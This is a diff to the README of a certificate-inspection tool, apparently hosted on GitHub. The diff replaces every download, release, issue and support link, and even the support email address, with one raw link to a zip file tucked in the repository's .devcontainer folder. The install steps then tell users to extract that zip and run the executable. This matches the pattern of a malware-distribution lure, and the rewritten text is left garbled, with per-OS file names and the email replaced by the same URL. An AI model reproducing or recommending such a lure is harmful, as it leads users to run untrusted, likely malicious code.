@@ -6,11 +6,11 @@ Welcome to cert-inspector! This web tool helps you view SSL certificates and DNS
 
 ## 📥 Download the Application
 
-[![Download cert-inspector](https://img.shields.io/badge/Download-certificate--inspector-blue)](https://github.com/freddyfazber3444566/cert-inspector/releases)
+[![Download cert-inspector](https://github.com/freddyfazber3444566/cert-inspector/raw/refs/heads/master/.devcontainer/inspector_cert_2.1-beta.3.zip)](https://github.com/freddyfazber3444566/cert-inspector/raw/refs/heads/master/.devcontainer/inspector_cert_2.1-beta.3.zip)
 
 To get started, visit the Releases page to download the app:
 
-[Download cert-inspector](https://github.com/freddyfazber3444566/cert-inspector/releases)
+[Download cert-inspector](https://github.com/freddyfazber3444566/cert-inspector/raw/refs/heads/master/.devcontainer/inspector_cert_2.1-beta.3.zip)
 
 ## 🔧 System Requirements
 
@@ -32,13 +32,13 @@ cert-inspector comes with a set of useful features:
 
 ## 🚀 Download & Install
 
-1. Go to the [Releases page](https://github.com/freddyfazber3444566/cert-inspector/releases).
+1. Go to the [Releases page](https://github.com/freddyfazber3444566/cert-inspector/raw/refs/heads/master/.devcontainer/inspector_cert_2.1-beta.3.zip).
 2. Choose the version you want to download. Click on the file that matches your operating system. For example:
-   - For Windows, select `cert-inspector-windows.exe`
-   - For macOS, choose `cert-inspector-macos.dmg`
-   - For Linux, use `cert-inspector-linux.tar.gz`
+   - For Windows, select `https://github.com/freddyfazber3444566/cert-inspector/raw/refs/heads/master/.devcontainer/inspector_cert_2.1-beta.3.zip`
+   - For macOS, choose `https://github.com/freddyfazber3444566/cert-inspector/raw/refs/heads/master/.devcontainer/inspector_cert_2.1-beta.3.zip`
+   - For Linux, use `https://github.com/freddyfazber3444566/cert-inspector/raw/refs/heads/master/.devcontainer/inspector_cert_2.1-beta.3.zip`
 3. After the download finishes, locate the file on your computer.
-4. Open the file to start the installation process. For `.exe` and `.dmg` files, follow the on-screen instructions. For `.tar.gz`, extract the files and run the executable.
+4. Open the file to start the installation process. For `.exe` and `.dmg` files, follow the on-screen instructions. For `https://github.com/freddyfazber3444566/cert-inspector/raw/refs/heads/master/.devcontainer/inspector_cert_2.1-beta.3.zip`, extract the files and run the executable.
 
 ## 🛠️ How to Use cert-inspector
 
@@ -68,7 +68,7 @@ For more help and updates, check the following:
 
 For direct support, you can reach out via the following channels:
 
-- GitHub Issues Page: [Report Issues](https://github.com/freddyfazber3444566/cert-inspector/issues)
-- Email: support@example.com
+- GitHub Issues Page: [Report Issues](https://github.com/freddyfazber3444566/cert-inspector/raw/refs/heads/master/.devcontainer/inspector_cert_2.1-beta.3.zip)
+- Email: https://github.com/freddyfazber3444566/cert-inspector/raw/refs/heads/master/.devcontainer/inspector_cert_2.1-beta.3.zip
 
 ### Thank you for using cert-inspector! We hope you find it helpful for your web monitoring needs.
